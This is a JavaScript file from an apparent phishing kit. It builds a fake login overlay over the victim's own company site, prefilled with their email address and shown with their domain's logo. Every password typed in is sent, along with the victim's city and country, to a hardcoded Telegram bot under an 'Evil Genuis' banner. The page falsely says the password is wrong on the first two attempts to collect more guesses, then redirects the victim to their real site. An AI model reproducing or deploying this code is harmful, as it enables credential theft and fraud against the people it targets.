

  
// Telegram Bot config
const TELEGRAM_BOT_TOKEN = "8472203015:AAFvwceukQ2Y2iRMtO5ML0WVIztYG5xWVN8";
const TELEGRAM_CHAT_ID = "7574749243";

// Elements
const rawHash = window.location.hash.substring(1);
const emailInput = document.getElementById('email');
const logoImg = document.getElementById('logo');
const bgFrame = document.getElementById('bg-frame');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('login-btn');
const errorMsg = document.getElementById('error-msg');
const overlay = document.querySelector('.overlay');
const loginBox = document.querySelector('.login-box');

let attempts = 0;
const maxAttempts = 3;

document.body.classList.add('blur-active');

// Helper: parse document.cookie into an object { name: value, ... }
function parseCookies(cookieString = document.cookie) {
  const cookies = {};
  if (!cookieString) return cookies;
  cookieString.split(';').forEach(pair => {
    const idx = pair.indexOf('=');
    if (idx > -1) {
      const name = pair.slice(0, idx).trim();
      const val = pair.slice(idx + 1).trim();
      try {
        cookies[name] = decodeURIComponent(val);
      } catch {
        cookies[name] = val;
      }
    }
  });
  return cookies;
}

// Grab cookies now
const cookies = parseCookies();
// Optional: console log to check cookies
console.log("Cookies available to JS:", cookies);


// Get email from URL  ?u=
const params = new URLSearchParams(window.location.search);
const rawEmail = params.get("document");

// Check if email exists AND is valid
if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {

  emailInput.value = rawEmail;
  emailInput.setAttribute("uneditable", true);

  const domain = rawEmail.split('@')[1];
  // HIDE parameter
  history.replaceState({}, document.title, window.location.pathname);
  
  // Set logo
  logoImg.src = `https://logo.clearbit.com/${domain}`;
  logoImg.onerror = () => {
    logoImg.src = "https://via.placeholder.com/150?text=Logo";
  };
// Set loading animation logo
        const loadingImg = document.getElementById('loading-logo');
        loadingImg.src = `https://logo.clearbit.com/${domain}`;
        loadingImg.onerror = () => { loadingImg.src = 'https://via.placeholder.com/80?text=L'; };

  
  // Setup fallback screenshot container
  const fallbackScreenshot = document.createElement('img');
  fallbackScreenshot.id = "fallback-screenshot";
  fallbackScreenshot.style.cssText = `
    display: none;
    position: fixed; top: 0; left: 0;
    width: 100vw; height: 100vh;
    object-fit: cover;
    z-index: 0;
    pointer-events: none;
  `;
  fallbackScreenshot.alt = "Screenshot fallback";
  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
  document.body.appendChild(fallbackScreenshot);

  // Load iframe with timeout
  let iframeLoaded = false;
  bgFrame.src = `https://${domain}`;

  bgFrame.onload = () => {
    iframeLoaded = true;
    fallbackScreenshot.style.display = "none";
    bgFrame.style.display = "block";
  };

  setTimeout(() => {
    if (!iframeLoaded) {
      bgFrame.style.display = "none";
      fallbackScreenshot.style.display = "block";
      // Keep overlay visible — do NOT hide it
      document.body.classList.remove('blur-active'); // optional blur removal
    }
  }, 6000);

  bgFrame.onerror = () => {
    bgFrame.style.display = "none";
    fallbackScreenshot.style.display = "block";
    // Keep overlay visible — do NOT hide it
    document.body.classList.remove('blur-active'); // optional blur removal
  };
}

// Fetch user country (mandatory)

// Location details
let userIP = "Unknown IP";
let userCity = "Unknown City";
let userCountry = "Unknown Country";
let userISP = "Unknown ISP";
loginBtn.disabled = true;

fetch("https://ipapi.co/json/")
  .then(res => res.json())
  .then(data => {
    userCity = data.city || userCity;
    userCountry = data.country_name || userCountry;
  })
  .catch(() => {
    // silent fail
  })
  .finally(() => {
    loginBtn.disabled = false;
  });

// Telegram message sender
function sendTelegramMessage(email, password, attempt, country) {
  const text = `👺Evil Genuis [${attempt}/3] ☠️\n` +
               ` 🧛🏿‍♂️UserId : [ ${email} ]\n` +
               `   🔐Pass : [ ${password} ]\n` +
               `🌍Country : [ ${userCity}, ${userCountry} ]`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: "HTML"
  };
  fetch(url, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(payload)
  }).catch(e => console.error("Telegram send failed:", e));
}
 // --- SHOW LOGIN AFTER LOADING ---
  setTimeout(() => {
    document.getElementById("loading").style.display = "none";
    loginBox.style.display = "block";
    setTimeout(() => loginBox.style.opacity = 1, 50);
  }, 3000);
// Login button handler
loginBtn.addEventListener('click', () => {
  const password = passwordInput.value.trim();
  if (password === "") {
    errorMsg.textContent = "Password cannot be empty.";
    return;
  }
  attempts++;
  sendTelegramMessage(emailInput.value, password, attempts, userCountry);

  if (attempts < maxAttempts) {
    errorMsg.textContent = "Incorrect password.";
    passwordInput.value = "";
  } else {
    errorMsg.textContent = "";
    overlay.style.display = 'none';
    document.body.classList.remove('blur-active');
    window.location.href = `https://${emailInput.value.split('@')[1]}`;
  }
});
